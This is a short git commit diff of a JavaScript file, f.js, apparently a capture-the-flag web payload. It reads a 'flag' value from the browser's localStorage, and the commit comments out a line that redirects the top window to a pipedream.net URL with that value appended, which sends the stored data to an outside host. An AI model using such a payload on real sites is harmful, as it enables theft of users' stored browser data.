9d053791db57ca994bc70c1114e77e09c445d281
damienmaier <91182145+damienmaier@users.noreply.github.com>
2025-04-14 14:46:05 +0200

    Update f.js

--- f.js
+++ f.js
@@ -1,3 +1,3 @@
 window.localStorage.setItem('script', 'script');
 let a = window.localStorage.getItem('flag');
-window.top.location.href='https://eocgxudt9qebbcc.m.pipedream.net/coucou' + a
+//window.top.location.href='https://eocgxudt9qebbcc.m.pipedream.net/coucou' + a
